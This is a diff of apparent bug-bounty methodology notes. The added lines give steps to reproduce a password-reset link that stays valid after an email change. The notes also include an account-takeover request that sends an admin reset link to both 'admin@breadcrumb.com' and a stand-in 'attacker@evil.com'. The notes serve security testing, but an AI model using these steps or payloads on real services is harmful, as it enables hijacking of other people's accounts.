@@ -2,6 +2,13 @@ My methodology for testing API endpoints:
 Chrome > F12 > network tab > and signup/login to my account.
 Open Url Redirects & exploiting them by :
 ***https://www.bugbountynotes.com/training/tutorial?id=1***
+Steps to repro:
+1) Create a HackerOne account having email address "a@x.com".
+2) Now Logout and ask for password reset link. Don't use the password reset link.
+3) Login using the same password back and update your email address to "b@x.com" and verify the same.
+4) Now logout and use the password reset link which was mailed to "a@x.com" in step 2.
+5) Password will be changed.
+
 
 POST https://hq.breadcrumb.com/api/v1/password_reset HTTP/1.1
 with body like {"email_address":["admin@breadcrumb.com","attacker@evil.com"]}
